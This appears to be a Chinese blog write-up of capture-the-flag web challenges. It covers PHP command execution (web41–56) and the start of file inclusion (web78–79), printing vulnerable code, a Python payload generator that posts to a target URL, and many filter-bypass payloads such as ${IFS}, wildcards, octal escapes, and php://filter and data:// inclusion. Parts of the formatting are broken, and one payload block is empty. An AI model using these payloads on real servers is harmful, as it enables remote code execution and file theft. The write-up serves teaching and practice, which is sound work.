<h3 id="web41-未"><a href="#web41-未" class="headerlink" title="web41(未)"></a>web41(未)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>未过滤【或 | 】运算符<br>可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串</p>
<blockquote>
<p>首先进行代码审计：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>题目首先接收一个<strong>POST</strong>请求中名为’c’的参数，然后进行过滤，若未被过滤则执行 eval(“echo($c);”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span><br></pre></td></tr></table></figure>

<p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用 ascii 码为 0-255 中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p>
<p>思路如下：</p>
<ul>
<li>首先对 ascii 从 0-255 所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li>
<li>跟据题目要求，构造 payload 的原型，并将原型替换为或运算的结果</li>
<li>使用 POST 请求发送 c,获取 flag</li>
</ul>
<p>羽师傅先把或运算的结果放进 txt，然后查表构造 payload，用了两个脚本，这里给一个一体化的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line">from urllib import parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">contents = []</span><br><span class="line"></span><br><span class="line">for i in range(256):</span><br><span class="line">    for j in range(256):</span><br><span class="line">        hex_i = &#x27;&#123;:02x&#125;&#x27;.format(i)</span><br><span class="line">        hex_j = &#x27;&#123;:02x&#125;&#x27;.format(j)</span><br><span class="line">        preg = re.compile(r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;, re.I)</span><br><span class="line">        if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))):</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            a = &#x27;%&#x27; + hex_i</span><br><span class="line">            b = &#x27;%&#x27; + hex_j</span><br><span class="line">            c = chr(int(a[1:], 16) | int(b[1:], 16))</span><br><span class="line">            if 32 &lt;= ord(c) &lt;= 126:</span><br><span class="line">                contents.append([c, a, b])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def make_payload(cmd):</span><br><span class="line">    payload1 = &#x27;&#x27;</span><br><span class="line">    payload2 = &#x27;&#x27;</span><br><span class="line">    for i in cmd:</span><br><span class="line">        for j in contents:</span><br><span class="line">            if i == j[0]:</span><br><span class="line">                payload1 += j[1]</span><br><span class="line">                payload2 += j[2]</span><br><span class="line">                break</span><br><span class="line">    payload = &#x27;(&quot;&#x27; + payload1 + &#x27;&quot;|&quot;&#x27; + payload2 + &#x27;&quot;)&#x27;</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = input(&#x27;url:&#x27;)</span><br><span class="line">payload = make_payload(&#x27;system&#x27;) + make_payload(&#x27;cat flag.php&#x27;)</span><br><span class="line">response = requests.post(URL, data=&#123;&#x27;c&#x27;: urllib.parse.unquote(payload)&#125;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>直接输入题目的 URL 就完事</p>
</blockquote>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong><code>&gt;/dev/null 2&gt;&amp;1</code></strong>：<br><strong>关键部分</strong>，这是一个 Shell 命令输出重定向技巧：</p>
<ul>
<li><code>&gt;/dev/null</code>：将标准输出（<code>stdout</code>）丢弃到空设备（不显示）。</li>
<li><code>2&gt;&amp;1</code>：将错误输出（<code>stderr</code>，文件描述符 2）重定向到标准输出（<code>stdout</code>，文件描述符 1），最终也被丢弃。</li>
</ul>
<p><strong>效果</strong>：命令执行后的所有输出（包括错误信息）都被隐藏，攻击者无法直接看到命令执行结果。</p>
</li>
</ol>
<p>假设你是一个餐厅老板（服务器），有两个 “传话筒”：</p>
<ol>
<li><strong>标准输出（stdout）</strong>：正常的订单信息（文件列表、命令结果）</li>
<li><strong>错误输出（stderr）</strong>：厨房报错（文件不存在、权限拒绝）</li>
</ol>
<p><strong>正常情况</strong>：<br>顾客（攻击者）点单（发送命令），你通过传话筒把结果喊回去（显示在网页上）。</p>
<p><strong>但这段代码做了什么？</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>相当于你把两个传话筒都剪断了，接到了一个 “黑洞”（<code>/dev/null</code>）：</p>
<ul>
<li><strong><code>&gt;/dev/null</code></strong>：把正常订单信息直接扔进垃圾桶</li>
<li><strong><code>2&gt;&amp;1</code></strong>：把厨房报错也重定向到和正常信息一样的 “黑洞”</li>
</ul>
<p><strong>结果</strong>：<br>顾客点了 “给我看菜单”（<code>ls /etc/passwd</code>），你确实去厨房查了菜单，但不管查到什么，都不会告诉顾客。顾客只能通过其他方式（比如观察餐厅灯光是否熄灭）猜测命令是否成功执行。</p>
<p>为什么攻击者喜欢这样？</p>
<ul>
<li><strong>隐藏踪迹</strong>：管理员查看日志时，只看到命令被执行，但看不到结果，很难发现异常。</li>
<li><strong>偷偷做事</strong>：攻击者可以执行 “下载病毒”“修改文件” 等操作，服务器表面看起来一切正常。</li>
</ul>
<p>生活类比</p>
<p>想象你家有个保姆，你允许她用微波炉热饭（执行命令），但她偷偷用微波炉烤手机（恶意操作），还把声音关掉（<code>&gt;/dev/null</code>），甚至把冒烟的警报器也拔掉（<code>2&gt;&amp;1</code>），你完全不知道她在干什么。</p>
<p><strong>永远不要让陌生人直接控制保姆！</strong><br>正确做法是：</p>
<ol>
<li>给保姆一个菜单（白名单），只允许她做菜单上的菜（预定义命令）</li>
<li>你亲自监督她做菜（验证用户输入）</li>
<li>保留监控录像（记录所有操作）</li>
</ol>
<blockquote>
<p>命令只是将错误输出重定向到了标准输出，并没有重定向标准输出，所以可以将错误输出重定向至&#x2F;dev&#x2F;null ?c&#x3D;cat flag.php &amp;2</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

<p><code>gsfdgdfg</code></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>​&#96;&#96;&#96;php<br> if(!preg_match(“&#x2F;;|cat&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>    }</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>?c&#x3D;tac flag.php||ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### web44</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>if(isset($_GET[‘c’])){<br>    $c&#x3D;$_GET[‘c’];<br>    if(!preg_match(“&#x2F;;|cat|flag&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>    }<br>}else{<br>    highlight_file(<strong>FILE</strong>);<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>?c&#x3D;tac fla*.php||ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; 服务器会重定向到 index.php，所以写入其他文件无法查看，直接修改 index.php 输出 flag。</span><br><span class="line">&gt;</span><br><span class="line">&gt; tee 命令不仅会将输入内容写入文件，还会将其输出到标准输出</span><br><span class="line">&gt;</span><br><span class="line">&gt; 所以构造 playload：</span><br><span class="line">&gt;</span><br><span class="line">&gt; c=echo &quot;&quot; | tee index.php</span><br><span class="line">&gt;</span><br><span class="line">&gt; 再访问 index.php 就是 flag.php 的内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; ------</span><br><span class="line">&gt;</span><br><span class="line">&gt; 无回显方式查看 flag 既然跟前面几个一样，这次只不过加了过滤 flag, 可以通过 cp 命令将 flag.php 的内容 cp 成 txt 格式的，?c = cp fla?.php 3.txt 后面直接访问 3.txt 就可以直接看到 flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### web46</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  if(! preg_match(“&#x2F;;|cat|flag| |[0-9]|\$|*&#x2F;i”, $ c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2 &gt;&amp;1 “);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">关键是通配符</span><br><span class="line"></span><br><span class="line">&gt; 几种绕过空格的方式 &#123;cat, flag.txt&#125; cat $&#123;IFS&#125;flag.txt cat$ IFS$9flag.txt cat &lt; flag.txt//这俩 &lt;&gt; 貌似没啥用 cat &lt;&gt; flag.txt</span><br><span class="line">&gt;</span><br><span class="line">&gt; cat%0afla?.php cat%09fla?.php 这俩的区别是后者用于语句中间，前者可以用来做末尾的截断</span><br><span class="line"></span><br><span class="line">&gt; 对于 &quot;&lt;&quot;和&quot;&lt;&gt;&quot; 的代替空格方式，要队 &quot;&lt;&quot;和&quot;&lt;&gt;&quot; url 编码，防止数据传输出现问题</span><br><span class="line"></span><br><span class="line">&gt; ?c = tac &lt; fla%27%27g.php||</span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = tac%09fla?.php||</span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = ca\t &lt; fl\ag.php||</span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = tac%09fla?.php%0Als</span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = tail%09fl&#x27;&#x27;ag.php||ls</span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = nl%09fl??.php%0a </span><br><span class="line">&gt;</span><br><span class="line">&gt; ?c = tac%09 `which%09ls`%0a</span><br><span class="line"></span><br><span class="line">### web47</span><br><span class="line"></span><br><span class="line">就是不屏蔽 tac</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">       system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还是使用前面两题的 payload ?c&#x3D;nl%09fl??.php%0a nl 这是 Linux&#x2F;Unix 命令 “number lines” 功能类似于 cat，但会在每行前面添加行号 用来替代被过滤的 cat 命令 %09 这是 ASCII 码表中制表符(Tab)的 URL 编码 十六进制值为 09，对应 Tab 字符 在命令行中，Tab 可以像空格一样分隔命令和参数 用来替代被过滤的空格字符 fl?? fl 是文件名的前两个字母，通常指 “flag” 每个 ? 是通配符，匹配任意单个字符 两个 ? 可以匹配 “ag”，组合起来就是 “flag” 这样绕过了对 “flag” 字符串的过滤 .php 文件扩展名，表示这是一个 PHP 文件 与前面的 fl?? 组合，可以匹配 “flag.php” 文件 %0a 这是换行符(LF)的 URL 编码 十六进制值为 0A，对应换行符 在命令执行时，会将后面的内容放到新的一行 使得 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 重定向变成单独的一行 这样 nl 命令的输出就不会被重定向到 &#x2F;dev&#x2F;null</p>
</blockquote>
<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>​&#96;&#96;&#96;php<br>  if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>?c&#x3D;tac&lt;fla%27%27g.php||ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### web50</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ta\c&lt;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>

<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=t\ac&lt;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>



<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>​&#96;&#96;&#96;php<br>  if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>?c&#x3D;ca\t${IFS}&#x2F;fla?||ls<br>?c&#x3D;nl${IFS}&#x2F;fla’’g%0a<br>?c&#x3D;t\ac${IFS}fla%27%27g.php||ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### web53</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>system()</code>的特殊之处在于它在 “返回值用于赋值” 的同时，还会 “执行命令并输出结果”，这是由函数设计决定的，与赋值操作本身无关。</p>
<pre><code>  echo($c);
    $d = system($c);
    echo &quot;&lt;br&gt;&quot;.$d;
</code></pre>
<p>​<br>​    这三行里面有很多废话，实际上就等于 system($c);<br>​    所以直接把上面的 payload 删掉||和后面的内容就好了<br>​    ?c&#x3D;ca’’t${IFS}fla’’g.php</p>
<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解法一： 使用使用 mv 命令把 flag 文件重命名，再使用 uniq 查看 a.txt（如果第二步看不到，请右键查看文件源代码） 第一步：c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line">第二步：c=uniq$&#123;IFS&#125;a.txt 解法二： c=uniq$&#123;IFS&#125;f???.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin 目录下的可执行程序。</p>
<p>但因为字母不能传入，我们需要使用通配符?来进行代替</p>
<p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p>
<p>替换后变成</p>
<p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p>
</blockquote>
<blockquote>
<p>bash 无字母命令执行</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>

<p>会执行<code>ls</code></p>
<p>故 payload 是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<blockquote>
<p>&#x2F;?c&#x3D;$’\143\141\164’%20*</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">八进制序列解码后分别为 tac 和 flag.php。</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>



<p>php 上传的文件会临时放在&#x2F;tmp 目录下</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接让 file&#x3D;flag.php 是没用的，因为他是一个 php 文件，包含到当前页面会被当成 php 源吗解析，那么他的 flag 是定义的属性，又不会给你打印出来，相当于执行了&lt;?php $flag&#x3D;xxxx，这里又不会给你打印，所以你需要用 filter 协议，以 base64 的格式去读取，或者用 data 协议去命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关键部分为 include 这里的$file 可由 get 传参控制，由于没有过滤所以这里方法较多。</p>
<p>使用 data 协议可以很直观有条理的获得 flag</p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code> 可以获取当前目录文件发现有一个 flag.php</p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code> 即可读取 flag.php 的中的内容。</p>
</blockquote>
<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>尝试使用短标签无果：</p>
